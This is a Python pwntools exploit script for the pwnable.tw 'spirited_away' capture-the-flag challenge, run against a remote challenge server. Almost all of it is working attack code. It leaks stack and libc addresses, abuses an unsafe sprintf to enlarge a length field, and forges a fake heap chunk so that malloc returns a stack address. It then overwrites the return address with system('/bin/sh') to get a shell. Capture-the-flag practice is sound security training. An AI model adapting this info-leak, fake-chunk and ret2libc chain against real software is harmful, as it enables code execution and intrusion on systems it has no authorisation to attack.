from pwn import *

DEBUG = len(sys.argv) > 1
with context.quiet:
    elf = ELF("./spirited_away")

if DEBUG:
    # after malloc() call: 0x08048654
    # before call to free(): 0x080488c9
    # after free() call: 0x080488ce
    # stage two, overwrite RET address by creating a fake free chunk
    p = process("./spirited_away_patched")
else:
    p = remote("chall.pwnable.tw", 10204)


def leave_comment(
    name: bytes,
    age: int,
    reason: bytes,
    comment: bytes,
    leave_more: bool = True,
):
    if name is not None:
        p.sendafter(b"name: ", name)

    p.sendlineafter(b"age: ", str(age).encode())
    p.sendafter(b"movie?", reason)
    if comment is not None:
        p.sendafter(b"comment: ", comment)

    if leave_more:
        p.sendlineafter(b"comment? <y/n>: ", b"y")


class Exploit:
    def __init__(self, p: tube):
        self._p = p
        self._ebp = None
        self._bin_sh = None
        with context.quiet:
            self._libc = ELF("./libc.so.6")

    def _leak_stack_data(self):
        leave_comment(
            name=b"P" * 4,
            age=1,
            # make sure that reason won't contain null bytes, as we want to leak the data right after it.
            reason=b"G" * 80,
            comment=b"B",
            leave_more=False,
        )

        p.recvuntil(b"Reason: ")
        p.recv(80)  # read reason
        saved_ebp = u32(p.recv(4))
        main_ret = u32(p.recv(4))
        _IO_2_1_stdout_ = u32(p.recv(4))
        info("Leaks:")
        info("----------------------------------")
        info(f"Saved EBP: {saved_ebp:#x}")
        survey_ebp = saved_ebp - 0x20
        info(f"Current EBP: {survey_ebp:#x}")
        info(f"main ret: {main_ret:#x}")
        info(f"_IO_2_1_stdout_: {_IO_2_1_stdout_:#x}")
        info("----------------------------------")

        libc_base = _IO_2_1_stdout_ - self._libc.sym["_IO_2_1_stdout_"]
        if libc_base % 0x1000 != 0:
            error("Leaked libc base is wrong.")

        info(f"libc base: {libc_base:#x}")
        p.sendlineafter(b"Would you like to leave another comment? <y/n>: ", b"y")
        return survey_ebp, libc_base

    def _stage1(self):
        info("Stage 1: Leaking stack data...")
        self._ebp, self._libc.address = self._leak_stack_data()
        self._bin_sh = next(self._libc.search(b"/bin/sh\x00"))
        info(f"system: {self._libc.sym.system:#x}")
        info(f"/bin/sh: {self._bin_sh:#x}")

    def _stage2(self):
        # exploit unsafe sprintf() call to overwrite name_len to 0 then to 110.
        info("Stage 2: exploit buggy sprintf call to overwrite name_len to 0x6e [110].")
        for _ in range(9):
            leave_comment(name=b"A", age=26, reason=b"A", comment=b"B", leave_more=True)

        # overwrite name len to 'n' (110)
        for _ in range(90):
            # name_len is currently overriden to zero, so we shouldn't supply input for name and comment.
            leave_comment(name=None, age=26, reason=b"A", comment=None, leave_more=True)

        info("name_len is overwritten to 110.")

    def _stage3(self):
        # Craft a fake heap chunk that will be freed() then next call to malloc will return it.
        # This is an arbitrary write primitive.
        log.info("Stage 3: redirecting execution to system()...")
        reason_offset = 0x50

        fake_malloc_ret = self._ebp - reason_offset + 8
        # overwrite char* name with fake_malloc_ret, so free(fake_malloc_ret) will be called.
        # it will then get into the fastbin free chunk and next call to malloc(60) will return the same address,
        # which will let us overwrite the return address.
        #           padding         age             char* name
        comment = b"A" * 80 + p32(0xBADC0DE) + p32(fake_malloc_ret)

        """
        we set the fake chunk ptr to the address of reason buffer + 8.
        the first 8 bytes will be the fake chunk metadata (size, prev_size).
        """

        # fake an allocated heap chunk:
        # we set the next chunk metadat to be full of 0x41 so the size will be 0x41,
        # otherwise glibc detects it and calls abort().
        #       prev_size   size       user data + next chunk metadata
        # See https://elixir.bootlin.com/glibc/glibc-2.3.1/source/malloc/malloc.c#L1657.

        leave_comment(
            name=b"AAAA",
            reason=flat(
                [
                    # prev_size (first chunk)
                    p32(0x00000000),
                    # size (first chunk)
                    p32(0x00000041),
                    # user data (first chunk)
                    b"\x00" * 60,
                    # size (next chunk). no prev_size because prev chunk is not free. must be aligned to 8, and must be minimum 16.
                    p32(0x0000000A),
                ]
            ),
            comment=comment,
            age=1,
            leave_more=True,
        )

        log.info(f"Next call to malloc() should return {fake_malloc_ret:#x}")

        # Next malloc() will return a pointer to ebp-0x50+8 (reason+8). We can now overwrite the return address
        # to gain code execution.
        leave_comment(
            name=flat(
                [
                    # padding
                    b"A" * 76,
                    # overwritten return address
                    p32(self._libc.sym["system"]),
                    # return address for system()
                    p32(0x00000000),
                    # system() param
                    p32(self._bin_sh),
                ]
            ),
            age=26,
            reason=b"A" * 80,
            comment=b"B" * 80,
            leave_more=False,
        )

        # make survey() return to the ROP
        p.sendlineafter(b"Would you like to leave another comment? <y/n>: ", b"n")
        p.recvline()  # Bye!

    def exploit(self):
        self._stage1()
        self._stage2()
        self._stage3()

        p.interactive()


def main():
    e = Exploit(p)
    e.exploit()


if __name__ == "__main__":
    main()
